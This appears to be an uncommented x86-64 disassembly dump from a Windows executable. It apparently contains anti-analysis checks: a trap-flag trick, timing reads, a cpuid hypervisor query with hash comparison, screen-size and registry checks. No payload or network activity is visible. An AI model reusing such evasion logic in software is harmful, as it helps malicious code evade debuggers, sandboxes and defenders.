   14003da3c:	mov    rsi,rcx
   14003da3f:	shr    rsi,0x20
   14003da43:	xor    rsi,rcx
   14003da46:	mov    QWORD PTR [rbp+0x1180],rsi
   14003da4d:	call   0x140064227
   14003da52:	mov    eax,0x5b3ea749
   14003da57:	xchg   DWORD PTR [rip+0x5b083],eax        # 0x140098ae0
   14003da5d:	mov    rcx,rsi
   14003da60:	lea    rsi,[rip+0x80]        # 0x14003dae7
   14003da67:	lea    rdi,[rip+0x91]        # 0x14003daff
   14003da6e:	lea    r9,[rip+0x75]        # 0x14003daea
   14003da75:	xor    r9,rcx
   14003da78:	rol    rcx,0x9
   14003da7c:	lea    rax,[rip+0x6a]        # 0x14003daed
   14003da83:	add    rax,rcx
   14003da86:	rol    rcx,0x9
   14003da8a:	lea    rdx,[rip+0x5f]        # 0x14003daf0
   14003da91:	xor    rdx,rcx
   14003da94:	rol    rcx,0x9
   14003da98:	lea    r10,[rip+0x54]        # 0x14003daf3
   14003da9f:	add    r10,rcx
   14003daa2:	rol    rcx,0x9
   14003daa6:	lea    r12,[rip+0x49]        # 0x14003daf6
   14003daad:	xor    r12,rcx
   14003dab0:	rol    rcx,0x9
   14003dab4:	lea    r13,[rip+0x3e]        # 0x14003daf9
   14003dabb:	add    r13,rcx
   14003dabe:	rol    rcx,0x9
   14003dac2:	lea    r14,[rip+0x33]        # 0x14003dafc
   14003dac9:	xor    r14,rcx
   14003dacc:	rol    rcx,0x9
   14003dad0:	lea    r11,[rip+0x6]        # 0x14003dadd
   14003dad7:	mov    r8,r11
   14003dada:	xor    r8,rcx
   14003dadd:	pushf
   14003dade:	or     QWORD PTR [rsp],0x100
   14003dae6:	popf
   14003dae7:	xor    r8,r11
   14003daea:	xor    r9,r11
   14003daed:	sub    rax,r11
   14003daf0:	xor    rdx,r11
   14003daf3:	sub    r10,r11
   14003daf6:	xor    r12,r11
   14003daf9:	sub    r13,r11
   14003dafc:	xor    r14,r11
   14003daff:	add    rdi,r11
   14003db02:	lea    rcx,[rip+0xfffffffffffffff6]        # 0x14003daff
   14003db09:	xor    r11d,r11d
   14003db0c:	xchg   DWORD PTR [rip+0x5afcd],r11d        # 0x140098ae0
   14003db13:	mov    QWORD PTR [rbp+0x7d0],r8
   14003db1a:	mov    r11,QWORD PTR [rbp+0x1180]
   14003db21:	mov    r8,r11
   14003db24:	ror    r8,1
   14003db27:	mov    QWORD PTR [rbp+0x7d8],r8
   14003db2e:	mov    QWORD PTR [rbp+0x7e0],r9
   14003db35:	mov    QWORD PTR [rbp+0x7e8],r11
   14003db3c:	mov    QWORD PTR [rbp+0x7f0],rax
   14003db43:	mov    rax,r11
   14003db46:	rol    rax,0x9
   14003db4a:	mov    QWORD PTR [rbp+0x7f8],rax
   14003db51:	mov    QWORD PTR [rbp+0x800],rdx
   14003db58:	mov    rax,r11
   14003db5b:	rol    rax,0x12
   14003db5f:	mov    QWORD PTR [rbp+0x808],rax
   14003db66:	mov    QWORD PTR [rbp+0x810],r10
   14003db6d:	mov    rax,r11
   14003db70:	rol    rax,0x1b
   14003db74:	mov    QWORD PTR [rbp+0x818],rax
   14003db7b:	mov    QWORD PTR [rbp+0x820],r12
   14003db82:	movabs r12,0xeb591050d1f713a9
   14003db8c:	mov    rax,r11
   14003db8f:	rol    rax,0x24
   14003db93:	mov    QWORD PTR [rbp+0x828],rax
   14003db9a:	mov    QWORD PTR [rbp+0x830],r13
   14003dba1:	lea    r13,[rbp+0x7d0]
   14003dba8:	mov    rax,r11
   14003dbab:	rol    rax,0x2d
   14003dbaf:	mov    QWORD PTR [rbp+0x838],rax
   14003dbb6:	rol    r11,0x36
   14003dbba:	mov    QWORD PTR [rbp+0x840],r14
   14003dbc1:	movabs r14,0x406aa9c82dbf9701
   14003dbcb:	mov    QWORD PTR [rbp+0x848],r11
   14003dbd2:	mov    QWORD PTR [rbp+0x850],rdi
   14003dbd9:	add    rcx,rcx
   14003dbdc:	mov    QWORD PTR [rbp+0x858],rcx
   14003dbe3:	mov    BYTE PTR [rip+0x5aea4],0x0        # 0x140098a8e
   14003dbea:	push   0x8
   14003dbec:	pop    rax
   14003dbed:	movabs rcx,0xd874c4a5ad678387
   14003dbf7:	cmp    rax,0x98
   14003dbfd:	je     0x14003dcdd
   14003dc03:	mov    rdx,rbx
   14003dc06:	xor    rdx,rcx
   14003dc09:	imul   rdx,r14
   14003dc0d:	mov    r8,rdx
   14003dc10:	shr    r8,0x1d
   14003dc14:	xor    r8,rdx
   14003dc17:	imul   r8,r12
   14003dc1b:	mov    rdx,r8
   14003dc1e:	shr    rdx,0x20
   14003dc22:	xor    rdx,r8
   14003dc25:	mov    r8,rcx
   14003dc28:	movabs r9,0x629eef0eeda7e1b9
   14003dc32:	xor    r8,r9
   14003dc35:	imul   r8,r14
   14003dc39:	mov    r10,r8
   14003dc3c:	shr    r10,0x1d
   14003dc40:	xor    r10,r8
   14003dc43:	imul   r10,r12
   14003dc47:	mov    r9,r10
   14003dc4a:	shr    r9,0x20
   14003dc4e:	xor    r9,r10
   14003dc51:	mov    r10,rdx
   14003dc54:	rol    r10,0x7
   14003dc58:	or     r9,0x1
   14003dc5c:	mov    r11,rdx
   14003dc5f:	rol    r11,0x29
   14003dc63:	add    r10,rcx
   14003dc66:	mov    r8,QWORD PTR [rbp+rax*1+0x7c8]
   14003dc6e:	add    r8,r10
   14003dc71:	imul   r8,r9
   14003dc75:	add    r8,rbx
   14003dc78:	add    r8,r15
   14003dc7b:	mov    r15,rcx
   14003dc7e:	rol    r15,0x20
   14003dc82:	movabs rdi,0x6161c4ba7c2419b8
   14003dc8c:	xor    r15,rdi
   14003dc8f:	lea    rsi,[r11+r15*1]
   14003dc93:	sub    r15,r10
   14003dc96:	add    rsi,QWORD PTR [rbp+rax*1+0x7d0]
   14003dc9e:	add    r15,r11
   14003dca1:	imul   rsi,r9
   14003dca5:	imul   r15,r9
   14003dca9:	sub    r15,rdx
   14003dcac:	sub    r15,rsi
   14003dcaf:	add    r15,r8
   14003dcb2:	xor    rcx,rdi
   14003dcb5:	imul   rcx,r14
   14003dcb9:	mov    r8,rcx
   14003dcbc:	shr    r8,0x1d
   14003dcc0:	xor    r8,rcx
   14003dcc3:	imul   r8,r12
   14003dcc7:	mov    rcx,r8
   14003dcca:	shr    rcx,0x20
   14003dcce:	xor    rcx,r8
   14003dcd1:	add    rax,0x10
   14003dcd5:	mov    rbx,rdx
   14003dcd8:	jmp    0x14003dbf7
   14003dcdd:	add    rbx,r15
   14003dce0:	mov    rcx,rbx
   14003dce3:	call   0x140063e18
   14003dce8:	mov    rdi,rax
   14003dceb:	call   0x140064168
   14003dcf0:	cmp    rax,0x1
   14003dcf4:	mov    QWORD PTR [rbp+0xcb0],rdi
   14003dcfb:	jne    0x14003ddbb
   14003dd01:	mov    rsi,rdx
   14003dd04:	mov    rcx,rdx
   14003dd07:	call   0x140064146
   14003dd0c:	cmp    rax,0x1
   14003dd10:	jne    0x14003ddbb
   14003dd16:	mov    rbx,rdx
   14003dd19:	mov    rcx,r13
   14003dd1c:	mov    rdx,rsi
   14003dd1f:	mov    r8,rbx
   14003dd22:	call   0x140066261
   14003dd27:	mov    r12,QWORD PTR [rbp+0x7d0]
   14003dd2e:	mov    rax,r12
   14003dd31:	neg    rax
   14003dd34:	jo     0x14003ddbb
   14003dd3a:	mov    r15,QWORD PTR [rbp+0x7d8]
   14003dd41:	imul   rdi,QWORD PTR [rbp+0x7e0],0x1c
   14003dd49:	add    rdi,r15
   14003dd4c:	mov    QWORD PTR [rbp+0x1140],r15
   14003dd53:	cmp    r15,rdi
   14003dd56:	je     0x14003ddac
   14003dd58:	mov    r14,r15
   14003dd5b:	add    r15,0x1c
   14003dd5f:	xor    edx,edx
   14003dd61:	cmp    rdx,0x8
   14003dd65:	je     0x14003dd73
   14003dd67:	cmp    BYTE PTR [r14+rdx*1],0x0
   14003dd6c:	je     0x14003dd76
   14003dd6e:	inc    rdx
   14003dd71:	jmp    0x14003dd61
   14003dd73:	push   0x8
   14003dd75:	pop    rdx
   14003dd76:	mov    rcx,r14
   14003dd79:	call   0x14003bca2
   14003dd7e:	test   al,al
   14003dd80:	je     0x14003dd53
   14003dd82:	mov    ecx,DWORD PTR [r14+0x14]
   14003dd86:	mov    eax,DWORD PTR [r14+0xc]
   14003dd8a:	cmp    ecx,eax
   14003dd8c:	cmovb  eax,ecx
   14003dd8f:	mov    ecx,DWORD PTR [r14+0x8]
   14003dd93:	lea    rdx,[rax+rcx*1]
   14003dd97:	add    rsi,rcx
   14003dd9a:	cmp    rdx,rbx
   14003dd9d:	mov    ecx,0x0
   14003dda2:	cmovbe rcx,rsi
   14003dda6:	jbe    0x1400412db
   14003ddac:	mov    rcx,r12
   14003ddaf:	mov    rdx,QWORD PTR [rbp+0x1140]
   14003ddb6:	call   0x140066533
   14003ddbb:	mov    QWORD PTR [rbp+0xf60],0x0
   14003ddc6:	mov    rbx,QWORD PTR [rbp+0x390]
   14003ddcd:	mov    r14,QWORD PTR [rbp+0x398]
   14003ddd4:	mov    rdx,QWORD PTR [rbp+0x3a0]
   14003dddb:	lea    rcx,[rbp+0x640]
   14003dde2:	call   0x14006f5a7
   14003dde7:	mov    rsi,QWORD PTR [rbp+0x648]
   14003ddee:	mov    rdi,QWORD PTR [rbp+0x650]
   14003ddf5:	lea    rcx,[rip+0x5ad24]        # 0x140098b20
   14003ddfc:	mov    edx,0x9394fb88
   14003de01:	mov    r8d,0x97e5cf42
   14003de07:	call   0x140064358
   14003de0c:	test   rax,rax
   14003de0f:	je     0x14003de31
   14003de11:	and    DWORD PTR [rbp+0x7d0],0x0
   14003de18:	mov    QWORD PTR [rsp+0x28],r13
   14003de1d:	mov    DWORD PTR [rsp+0x20],r14d
   14003de22:	mov    cx,0x2
   14003de26:	mov    rdx,rsi
   14003de29:	mov    r8d,edi
   14003de2c:	mov    r9,rbx
   14003de2f:	call   rax
   14003de31:	xor    eax,eax
   14003de33:	cmp    rax,0x40
   14003de37:	je     0x14003de54
   14003de39:	mov    QWORD PTR [rbp+rax*1+0x7d0],0x1
   14003de45:	and    QWORD PTR [rbp+rax*1+0x7d8],0x0
   14003de4e:	add    rax,0x10
   14003de52:	jmp    0x14003de33
   14003de54:	lea    rax,[rbp+0x7e0]
   14003de5b:	movups xmm0,XMMWORD PTR [rax]
   14003de5e:	movups xmm1,XMMWORD PTR [rax+0x10]
   14003de62:	movups xmm2,XMMWORD PTR [rax+0x20]
   14003de66:	lea    rdx,[rbp+0xf90]
   14003de6d:	movups XMMWORD PTR [rdx+0x20],xmm2
   14003de71:	movups XMMWORD PTR [rdx+0x10],xmm1
   14003de75:	movups XMMWORD PTR [rdx],xmm0
   14003de78:	mov    QWORD PTR [rbp+0xf80],rsi
   14003de7f:	mov    QWORD PTR [rbp+0xf88],rdi
   14003de86:	push   0x1
   14003de88:	pop    rsi
   14003de89:	mov    QWORD PTR [rbp+0xfc0],rsi
   14003de90:	lea    rdi,[rbp+0xf80]
   14003de97:	mov    rcx,rdi
   14003de9a:	call   0x14003bf02
   14003de9f:	lea    rcx,[rax+0x9]
   14003dea3:	mov    rbx,rcx
   14003dea6:	shr    rbx,0x6
   14003deaa:	and    ecx,0x3f
   14003dead:	cmp    rcx,rsi
   14003deb0:	sbb    rbx,0xffffffffffffffff
   14003deb4:	mov    QWORD PTR [rbp+0x1140],rbx
   14003debb:	shl    rbx,0x6
   14003debf:	sub    rbx,rax
   14003dec2:	lea    r14,[rbx-0x9]
   14003dec6:	shl    rax,0x3
   14003deca:	bswap  rax
   14003decd:	mov    QWORD PTR [rbp+0xd10],rdi
   14003ded4:	mov    QWORD PTR [rbp+0xd18],rsi
   14003dedb:	lea    rcx,[rbp+0xd18]
   14003dee2:	movups XMMWORD PTR [rcx+0x8],xmm6
   14003dee6:	movups XMMWORD PTR [rcx+0x18],xmm6
   14003deea:	mov    QWORD PTR [rbp+0xd40],r14
   14003def1:	mov    QWORD PTR [rbp+0xd48],rax
   14003def8:	mov    eax,0x67452301
   14003defd:	mov    QWORD PTR [rbp+0x1180],rax
   14003df04:	mov    DWORD PTR [rbp+0x1170],0xefcdab89
   14003df0e:	mov    DWORD PTR [rbp+0x1178],0x98badcfe
   14003df18:	mov    DWORD PTR [rbp+0x1168],0x10325476
   14003df22:	mov    DWORD PTR [rbp+0x1158],0xc3d2e1f0
   14003df2c:	mov    sil,0x1
   14003df2f:	xor    r15d,r15d
   14003df32:	xor    r13d,r13d
   14003df35:	xor    r12d,r12d
   14003df38:	xor    edi,edi
   14003df3a:	cmp    rdi,QWORD PTR [rbp+0x1140]
   14003df41:	je     0x14003e1fd
   14003df47:	movaps XMMWORD PTR [rbp+0x2c0],xmm6
   14003df4e:	movaps XMMWORD PTR [rbp+0x2b0],xmm6
   14003df55:	movaps XMMWORD PTR [rbp+0x2a0],xmm6
   14003df5c:	movaps XMMWORD PTR [rbp+0x290],xmm6
   14003df63:	mov    rax,QWORD PTR [rbp+0xf80]
   14003df6a:	mov    rcx,QWORD PTR [rbp+0xf88]
   14003df71:	xor    r8d,r8d
   14003df74:	cmp    r8,0x40
   14003df78:	je     0x14003e002
   14003df7e:	mov    rdx,r8
   14003df81:	inc    r8
   14003df84:	test   r12,r12
   14003df87:	sete   r10b
   14003df8b:	mov    r9,r13
   14003df8e:	test   r10b,0x1
   14003df92:	je     0x14003dfae
   14003df94:	xor    r13d,r13d
   14003df97:	mov    r10d,0x0
   14003df9d:	cmp    r9,rcx
   14003dfa0:	jae    0x14003df8b
   14003dfa2:	mov    r10b,BYTE PTR [rax+r9*1]
   14003dfa6:	inc    r9
   14003dfa9:	xor    r12d,r12d
   14003dfac:	jmp    0x14003dff2
   14003dfae:	test   r15,r15
   14003dfb1:	je     0x14003dfe6
   14003dfb3:	lea    r11,[r15+0x1]
   14003dfb7:	cmp    r15,r14
   14003dfba:	jbe    0x14003dfd8
   14003dfbc:	sub    r15,rbx
   14003dfbf:	cmp    r15,0xfffffffffffffff8
   14003dfc3:	jb     0x14003dfd8
   14003dfc5:	mov    r10b,BYTE PTR [rbp+r15*1+0xd50]
   14003dfcd:	xor    esi,esi
   14003dfcf:	push   0x1
   14003dfd1:	pop    r12
   14003dfd3:	mov    r15,r11
   14003dfd6:	jmp    0x14003dff2
   14003dfd8:	xor    esi,esi
   14003dfda:	push   0x1
   14003dfdc:	pop    r12
   14003dfde:	mov    r15,r11
   14003dfe1:	xor    r10d,r10d
   14003dfe4:	jmp    0x14003dff2
   14003dfe6:	mov    r10b,0x80
   14003dfe9:	xor    esi,esi
   14003dfeb:	push   0x1
   14003dfed:	pop    r15
   14003dfef:	mov    r12,r15
   14003dff2:	mov    BYTE PTR [rbp+rdx*1+0x290],r10b
   14003dffa:	mov    r13,r9
   14003dffd:	jmp    0x14003df74
   14003e002:	mov    BYTE PTR [rbp+0xd50],sil
   14003e009:	mov    QWORD PTR [rbp+0xd20],r12
   14003e010:	mov    QWORD PTR [rbp+0xd28],r13
   14003e017:	mov    QWORD PTR [rbp+0xd38],r15
   14003e01e:	movaps XMMWORD PTR [rbp+0x430],xmm6
   14003e025:	movaps XMMWORD PTR [rbp+0x420],xmm6
   14003e02c:	movaps XMMWORD PTR [rbp+0x410],xmm6
   14003e033:	movaps XMMWORD PTR [rbp+0x400],xmm6
   14003e03a:	xor    eax,eax
   14003e03c:	cmp    rax,0x40
   14003e040:	je     0x14003e058
   14003e042:	mov    ecx,DWORD PTR [rbp+rax*1+0x290]
   14003e049:	bswap  ecx
   14003e04b:	mov    DWORD PTR [rbp+rax*1+0x400],ecx
   14003e052:	add    rax,0x4
   14003e056:	jmp    0x14003e03c
   14003e058:	mov    rax,QWORD PTR [rbp+0x1180]
   14003e05f:	mov    DWORD PTR [rbp+0x7d0],eax
   14003e065:	mov    eax,DWORD PTR [rbp+0x1170]
   14003e06b:	mov    DWORD PTR [rbp+0x7d4],eax
   14003e071:	mov    eax,DWORD PTR [rbp+0x1178]
   14003e077:	mov    DWORD PTR [rbp+0x7d8],eax
   14003e07d:	mov    eax,DWORD PTR [rbp+0x1168]
   14003e083:	mov    DWORD PTR [rbp+0x7dc],eax
   14003e089:	mov    eax,DWORD PTR [rbp+0x1158]
   14003e08f:	mov    DWORD PTR [rbp+0x7e0],eax
   14003e095:	and    DWORD PTR [rbp+0x7e4],0x0
   14003e09c:	movaps xmm0,XMMWORD PTR [rbp+0x400]
   14003e0a3:	movaps xmm1,XMMWORD PTR [rbp+0x410]
   14003e0aa:	movaps xmm2,XMMWORD PTR [rbp+0x420]
   14003e0b1:	movaps xmm3,XMMWORD PTR [rbp+0x430]
   14003e0b8:	lea    rax,[rbp+0x7e8]
   14003e0bf:	movups XMMWORD PTR [rax+0x30],xmm3
   14003e0c3:	movups XMMWORD PTR [rax+0x20],xmm2
   14003e0c7:	movups XMMWORD PTR [rax+0x10],xmm1
   14003e0cb:	movups XMMWORD PTR [rax],xmm0
   14003e0ce:	call   0x140064214
   14003e0d3:	mov    al,BYTE PTR [rip+0x5a9b4]        # 0x140098a8d
   14003e0d9:	cmp    al,0x1
   14003e0db:	je     0x14003e124
   14003e0dd:	movzx  eax,al
   14003e0e0:	cmp    eax,0x2
   14003e0e3:	je     0x14003e1ee
   14003e0e9:	and    DWORD PTR [rbp+0x610],0x0
   14003e0f0:	lea    rcx,[rip+0xfffffffffffc2f89]        # 0x140001080
   14003e0f7:	mov    rdx,QWORD PTR [rbp+0x1150]
   14003e0fe:	push   0x40
   14003e100:	pop    r8
   14003e102:	lea    r9,[rbp+0x610]
   14003e109:	call   QWORD PTR [rip+0x566f9]        # 0x140094808
   14003e10f:	test   eax,eax
   14003e111:	sete   cl
   14003e114:	inc    cl
   14003e116:	mov    BYTE PTR [rip+0x5a971],cl        # 0x140098a8d
   14003e11c:	test   eax,eax
   14003e11e:	je     0x14003e1ee
   14003e124:	mov    al,BYTE PTR [rip+0x5aa8e]        # 0x140098bb8
   14003e12a:	cmp    al,0x1
   14003e12c:	je     0x14003e155
   14003e12e:	movzx  eax,al
   14003e131:	test   eax,eax
   14003e133:	jne    0x14003e1ee
   14003e139:	call   0x140065d51
   14003e13e:	test   rax,rax
   14003e141:	sete   cl
   14003e144:	inc    cl
   14003e146:	mov    BYTE PTR [rip+0x5aa6c],cl        # 0x140098bb8
   14003e14c:	test   rax,rax
   14003e14f:	je     0x14003e1ee
   14003e155:	call   0x140064227
   14003e15a:	mov    eax,0xc8c291de
   14003e15f:	xchg   DWORD PTR [rip+0x5a97b],eax        # 0x140098ae0
   14003e165:	call   QWORD PTR [rip+0x564e5]        # 0x140094650
   14003e16b:	mov    eax,eax
   14003e16d:	mov    QWORD PTR [rip+0x59e8c],rax        # 0x140098000
   14003e174:	lea    rcx,[rbp+0x7d0]
   14003e17b:	push   0xffffffffffffffff
   14003e17d:	pop    rdx
   14003e17e:	call   0x140010840
   14003e183:	xor    eax,eax
   14003e185:	xchg   DWORD PTR [rip+0x5a955],eax        # 0x140098ae0
   14003e18b:	mov    BYTE PTR [rip+0x5a8fc],0x0        # 0x140098a8e
   14003e192:	mov    rax,QWORD PTR [rbp+0x1180]
   14003e199:	add    eax,DWORD PTR [rbp+0x7d0]
   14003e19f:	mov    QWORD PTR [rbp+0x1180],rax
   14003e1a6:	mov    eax,DWORD PTR [rbp+0x1170]
   14003e1ac:	add    eax,DWORD PTR [rbp+0x7d4]
   14003e1b2:	mov    DWORD PTR [rbp+0x1170],eax
   14003e1b8:	mov    eax,DWORD PTR [rbp+0x1178]
   14003e1be:	add    eax,DWORD PTR [rbp+0x7d8]
   14003e1c4:	mov    DWORD PTR [rbp+0x1178],eax
   14003e1ca:	mov    eax,DWORD PTR [rbp+0x1168]
   14003e1d0:	add    eax,DWORD PTR [rbp+0x7dc]
   14003e1d6:	mov    DWORD PTR [rbp+0x1168],eax
   14003e1dc:	mov    eax,DWORD PTR [rbp+0x1158]
   14003e1e2:	add    eax,DWORD PTR [rbp+0x7e0]
   14003e1e8:	mov    DWORD PTR [rbp+0x1158],eax
   14003e1ee:	inc    rdi
   14003e1f1:	mov    BYTE PTR [rip+0x5a894],0x0        # 0x140098a8c
   14003e1f8:	jmp    0x14003df3a
   14003e1fd:	mov    rcx,QWORD PTR [rbp+0x640]
   14003e204:	mov    rdx,QWORD PTR [rbp+0x648]
   14003e20b:	call   0x14006f7f7
   14003e210:	mov    rax,QWORD PTR [rbp+0x1160]
   14003e217:	mov    r9,QWORD PTR [rax+0x18]
   14003e21b:	rdtsc
   14003e21d:	mov    r8,rdx
   14003e220:	shl    r8,0x20
   14003e224:	or     r8,rax
   14003e227:	xor    ecx,ecx
   14003e229:	mov    eax,0x40000000
   14003e22e:	mov    r10,rbx
   14003e231:	cpuid
   14003e233:	xchg   rbx,r10
   14003e236:	mov    DWORD PTR [rbp+0x7d0],r10d
   14003e23d:	mov    WORD PTR [rbp+0x7d4],cx
   14003e244:	xor    ecx,ecx
   14003e246:	movabs rax,0xe49e47b70d5eafc7
   14003e250:	movabs rsi,0x406aa9c82dbf9701
   14003e25a:	movabs r12,0xeb591050d1f713a9
   14003e264:	movabs r13,0xf78a05c12bafb8cf
   14003e26e:	lea    rdi,[rip+0x4a0ab]        # 0x140088320
   14003e275:	cmp    rcx,0x6
   14003e279:	je     0x14003e2a8
   14003e27b:	movzx  edx,BYTE PTR [rbp+rcx*1+0x7d0]
   14003e283:	lea    r10d,[rdx-0x41]
   14003e287:	mov    r11d,edx
   14003e28a:	or     edx,0x20
   14003e28d:	cmp    r10b,0x1a
   14003e291:	cmovae edx,r11d
   14003e295:	movzx  edx,dx
   14003e298:	xor    rax,rdx
   14003e29b:	imul   rax,r13
   14003e29f:	rol    rax,0x21
   14003e2a3:	inc    rcx
   14003e2a6:	jmp    0x14003e275
   14003e2a8:	movabs rcx,0xe49e47b70d5eafc7
   14003e2b2:	xor    rax,rcx
   14003e2b5:	imul   rax,rsi
   14003e2b9:	mov    rcx,rax
   14003e2bc:	shr    rcx,0x1d
   14003e2c0:	xor    rcx,rax
   14003e2c3:	imul   rcx,r12
   14003e2c7:	mov    rax,rcx
   14003e2ca:	shr    rax,0x20
   14003e2ce:	xor    rax,rcx
   14003e2d1:	xor    ecx,ecx
   14003e2d3:	xor    ebx,ebx
   14003e2d5:	cmp    rcx,0x30
   14003e2d9:	je     0x14003e2ea
   14003e2db:	cmp    QWORD PTR [rcx+rdi*1],rax
   14003e2df:	sete   dl
   14003e2e2:	or     bl,dl
   14003e2e4:	add    rcx,0x8
   14003e2e8:	jmp    0x14003e2d5
   14003e2ea:	mov    eax,DWORD PTR [rbp+0x1170]
   14003e2f0:	mov    rcx,QWORD PTR [rbp+0x1180]
   14003e2f7:	shl    rcx,0x20
   14003e2fb:	or     rcx,rax
   14003e2fe:	mov    QWORD PTR [rbp+0x1180],rcx
   14003e305:	movabs rax,0x5cc804d7e1924f60
   14003e30f:	xor    r8,rax
   14003e312:	imul   r8,rsi
   14003e316:	mov    rax,r8
   14003e319:	shr    rax,0x1d
   14003e31d:	xor    rax,r8
   14003e320:	imul   rax,r12
   14003e324:	mov    rdi,rax
   14003e327:	shr    rdi,0x20
   14003e32b:	xor    rdi,rax
   14003e32e:	mov    rax,rdi
   14003e331:	neg    rax
   14003e334:	add    rax,r9
   14003e337:	mov    QWORD PTR [rbp+0x1058],rax
   14003e33e:	movaps XMMWORD PTR [rbp+0x7f0],xmm6
   14003e345:	movaps XMMWORD PTR [rbp+0x7e0],xmm6
   14003e34c:	movaps XMMWORD PTR [rbp+0x7d0],xmm6
   14003e353:	lea    rsi,[rbp+0x7d0]
   14003e35a:	mov    rcx,rsi
   14003e35d:	call   0x14006487c
   14003e362:	mov    r14d,DWORD PTR [rbp+0x7f0]
   14003e369:	movaps XMMWORD PTR [rbp+0x7d0],xmm6
   14003e370:	movaps XMMWORD PTR [rbp+0x800],xmm6
   14003e377:	movaps XMMWORD PTR [rbp+0x7f0],xmm6
   14003e37e:	movaps XMMWORD PTR [rbp+0x7e0],xmm6
   14003e385:	mov    DWORD PTR [rbp+0x7d0],0x40
   14003e38f:	mov    rcx,rsi
   14003e392:	call   0x140065f57
   14003e397:	test   eax,eax
   14003e399:	mov    QWORD PTR [rbp+0x3e8],rdi
   14003e3a0:	mov    QWORD PTR [rbp+0x4d8],rbx
   14003e3a7:	mov    DWORD PTR [rbp+0x6f8],r14d
   14003e3ae:	je     0x14003e405
   14003e3b0:	mov    eax,DWORD PTR [rbp+0x7dc]
   14003e3b6:	xor    ecx,ecx
   14003e3b8:	test   rax,rax
   14003e3bb:	sete   cl
   14003e3be:	shl    ecx,0x10
   14003e3c1:	mov    QWORD PTR [rbp+0xf78],rcx
   14003e3c8:	jmp    0x14003e410
   14003e3ca:	push   0x8
   14003e3cc:	pop    rax
   14003e3cd:	movabs r14,0x406aa9c82dbf9701
   14003e3d7:	movabs r12,0xeb591050d1f713a9
   14003e3e1:	cmp    rax,0x98
   14003e3e7:	je     0x14003dbea
   14003e3ed:	or     QWORD PTR [rbp+rax*1+0x7c8],0xffffffffffffffff
   14003e3f6:	and    QWORD PTR [rbp+rax*1+0x7d0],0x0
   14003e3ff:	add    rax,0x10
   14003e403:	jmp    0x14003e3e1
   14003e405:	mov    QWORD PTR [rbp+0xf78],0x0
   14003e410:	mov    rax,QWORD PTR [rbp+0x1180]
   14003e417:	bswap  rax
   14003e41a:	mov    QWORD PTR [rbp+0x1180],rax
   14003e421:	xor    ebx,ebx
   14003e423:	xor    ecx,ecx
   14003e425:	call   0x140065dcb
   14003e42a:	mov    esi,eax
   14003e42c:	push   0x1
   14003e42e:	pop    rcx
   14003e42f:	call   0x140065dcb
   14003e434:	test   esi,esi
   14003e436:	setg   cl
   14003e439:	test   eax,eax
   14003e43b:	setg   dl
   14003e43e:	and    dl,cl
   14003e440:	cmp    esi,0x400
   14003e446:	setb   cl
   14003e449:	cmp    eax,0x258
   14003e44e:	setb   al
   14003e451:	or     al,cl
   14003e453:	and    al,dl
   14003e455:	movzx  eax,al
   14003e458:	shl    eax,0x18
   14003e45b:	mov    QWORD PTR [rbp+0x1138],rax
   14003e462:	lea    rax,[rip+0x5fb9f]        # 0x14009e008
   14003e469:	mov    QWORD PTR [rbp+0x7d0],rax
   14003e470:	mov    QWORD PTR [rbp+0x7d8],0x21
   14003e47b:	mov    eax,0xc250001c
   14003e480:	mov    QWORD PTR [rbp+0x7e0],rax
   14003e487:	lea    rcx,[rbp+0x290]
   14003e48e:	lea    r14,[rbp+0x7d0]
   14003e495:	mov    rdx,r14
   14003e498:	call   0x14006392b
   14003e49d:	lea    rax,[rip+0x5fb5c]        # 0x14009e000
   14003e4a4:	mov    QWORD PTR [rbp+0x7d0],rax
   14003e4ab:	push   0x8
   14003e4ad:	pop    r15
   14003e4af:	mov    QWORD PTR [rbp+0x7d8],r15
   14003e4b6:	mov    eax,0xc260001c
   14003e4bb:	mov    QWORD PTR [rbp+0x7e0],rax
   14003e4c2:	lea    rcx,[rbp+0x400]
   14003e4c9:	mov    rdx,r14
   14003e4cc:	call   0x14006392b
   14003e4d1:	mov    rdx,QWORD PTR [rbp+0x298]
   14003e4d8:	and    QWORD PTR [rbp+0x7d0],0x0
   14003e4e0:	mov    ecx,0x80000002
   14003e4e5:	mov    QWORD PTR [rbp+0x1140],rdx
   14003e4ec:	mov    r8,r14
   14003e4ef:	call   0x14006490c
   14003e4f4:	xor    esi,esi
   14003e4f6:	test   eax,eax
   14003e4f8:	sete   sil
   14003e4fc:	mov    rdi,QWORD PTR [rbp+0x7d0]
   14003e503:	mov    rdx,QWORD PTR [rbp+0x408]
   14003e50a:	and    QWORD PTR [rbp+0x7d0],0x0
   14003e512:	mov    ecx,0x80000002
   14003e517:	mov    QWORD PTR [rbp+0x7c0],rdx
   14003e51e:	mov    r8,r14
   14003e521:	call   0x14006490c
   14003e526:	xor    ecx,ecx
   14003e528:	test   eax,eax
   14003e52a:	sete   cl
   14003e52d:	mov    rax,QWORD PTR [rbp+0x7d0]
   14003e534:	mov    QWORD PTR [rbp+0xf80],rsi
   14003e53b:	mov    QWORD PTR [rbp+0xf88],rdi
   14003e542:	mov    QWORD PTR [rbp+0xf90],rcx
   14003e549:	mov    QWORD PTR [rbp+0xf98],rax
   14003e550:	mov    QWORD PTR [rbp+0xd10],r15
   14003e557:	lea    rax,[rbp+0xd18]
   14003e55e:	movups XMMWORD PTR [rax],xmm6
   14003e561:	lea    rax,[rip+0x49cb8]        # 0x140088220
   14003e568:	mov    QWORD PTR [rbp+0xd28],rax
   14003e56f:	mov    QWORD PTR [rbp+0xd30],0x6
   14003e57a:	lea    rax,[rip+0x49c7f]        # 0x140088200
   14003e581:	mov    QWORD PTR [rbp+0xd38],rax
   14003e588:	push   0x1
   14003e58a:	pop    rcx
   14003e58b:	mov    QWORD PTR [rbp+0xd40],rcx
   14003e592:	mov    QWORD PTR [rbp+0xd48],rcx
   14003e599:	lea    rax,[rax+r15*1]
   14003e59d:	mov    QWORD PTR [rbp+0xd50],rax
   14003e5a4:	mov    QWORD PTR [rbp+0xd58],rcx
   14003e5ab:	lea    rax,[rip+0x49c5e]        # 0x140088210
   14003e5b2:	mov    QWORD PTR [rbp+0xd60],rax
   14003e5b9:	mov    QWORD PTR [rbp+0xd68],rcx
   14003e5c0:	mov    QWORD PTR [rbp+0xd70],rcx
   14003e5c7:	lea    rax,[rip+0x49c4a]        # 0x140088218
   14003e5ce:	mov    QWORD PTR [rbp+0xd78],rax
   14003e5d5:	mov    QWORD PTR [rbp+0xd80],rcx
   14003e5dc:	xor    edx,edx
   14003e5de:	push   0x2
   14003e5e0:	pop    r14
   14003e5e2:	imul   rax,rbx,0x28
   14003e5e6:	lea    rcx,[rbp+0xce8]
   14003e5ed:	add    rax,rcx
